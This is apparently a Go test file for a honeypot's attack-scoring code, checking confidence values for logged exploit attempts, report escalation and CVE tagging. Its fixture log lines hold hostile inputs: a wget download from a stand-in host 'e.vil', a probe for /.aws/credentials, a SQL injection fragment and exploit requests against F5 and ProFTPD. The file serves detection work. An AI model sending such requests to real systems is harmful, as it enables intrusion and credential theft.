package main

import "testing"

func TestConfidenceForEvent(t *testing.T) {
	cases := []struct {
		name, code, category, line string
		want                       float64
	}{
		{"connect only", "T1133", "FTP Arbitrary File Copy / RCE Attempt (CVE-2015-3306)", "1.2.3.4:5 connected to [::]:2121 [T1133 ...] dest=[::]:2121 proto=tcp", 0.5},
		{"persona recon landing", "T1133", "F5 BIG-IP Exploitation Attempt (CVE-2022-1388)", `1.2.3.4:5 GET / [T1133 External Remote Services | x] dest=:4445 proto=http ua="x"`, 0.5},
		{"persona CVE trap", "T1190", "F5 BIG-IP Exploitation Attempt (CVE-2022-1388)", `1.2.3.4:5 POST /mgmt/tm/util/bash [T1190 ...] dest=:4445 proto=http ua="x" body="{}"`, 0.95},
		{"persona trap + payload flag", "T1190", "F5 BIG-IP Exploitation Attempt (CVE-2022-1388)", `1.2.3.4:5 POST /mgmt/tm/util/bash [T1190 ...] proto=http rce_payload=true`, 0.98},
		{"persona trap + downloader", "T1190", "Cisco ASA Exploitation Attempt (CVE-2020-3452)", `1.2.3.4:5 POST /x [T1190 ...] body="cmd=wget http://e.vil/x.sh"`, 0.98},
		{"misconfig trap, no CVE", "T1190", "Apache Hadoop YARN Exploitation Attempt (unauth-app-submit (no CVE))", `1.2.3.4:5 POST /ws [T1190 ...] proto=http`, 0.85},
		{"web vuln probe", "T1190", "GraphQL Introspection / Abuse Attempt", `1.2.3.4:5 POST /graphql [T1190 ...] proto=http`, 0.8},
		{"sensitive file probe", "T1190", "Sensitive File / Debug Endpoint Exposure Attempt", `1.2.3.4:5 GET /.aws/credentials [T1190 ...] proto=http`, 0.7},
		{"SQLi payload (benign &id=)", "T1190", "SQL Injection Attempt", `1.2.3.4:5 GET /products?a=1&id=5 UNION SELECT [T1190 ...] proto=http`, 0.95},
		{"tcp decoy data", "T1190", "SSH Pre-Auth RCE Attempt (CVE-2025-32433)", `1.2.3.4:5 sent "x" to Erlang/OTP SSH [T1190 ...] dest=:2222 proto=tcp`, 0.85},
		{"tcp decoy exploit cmd", "T1190", "FTP Arbitrary File Copy / RCE Attempt (CVE-2015-3306)", `1.2.3.4:5 sent "SITE CPTO /var/www/x.php" to ProFTPD [T1190 ...] proto=tcp`, 0.98},
		{"udp scan", "T1595.002", "BMC Credential Hash Disclosure Probe", `1.2.3.4:5 sent 1 bytes 78 to IPMI [T1595.002 ...] proto=udp`, 0.6},
	}
	for _, c := range cases {
		if got := confidenceForEvent(c.code, c.category, c.line); got != c.want {
			t.Errorf("%s: got %.2f, want %.2f", c.name, got, c.want)
		}
	}
}

func TestShouldReportEscalates(t *testing.T) {
	ip := "203.0.113.99"
	reportedMu.Lock()
	delete(reportedAt, ip)
	delete(reportedConf, ip)
	reportedMu.Unlock()

	if !shouldReport(ip, 0.5) {
		t.Fatal("first sighting must be reported")
	}
	if shouldReport(ip, 0.5) {
		t.Error("same-strength repeat inside cooldown must be suppressed")
	}
	if !shouldReport(ip, 0.95) {
		t.Error("an exploit after a bare connect must escalate through the cooldown")
	}
	if shouldReport(ip, 0.95) || shouldReport(ip, 0.5) {
		t.Error("equal/weaker repeats after escalation must be suppressed")
	}
}

func TestCVETags(t *testing.T) {
	got := cveTags("x (CVE-2022-1388,CVE-2023-46747,CVE-2022-1388)")
	if len(got) != 2 || got[0] != "cve#CVE-2022-1388" {
		t.Errorf("unexpected tags %v", got)
	}
}
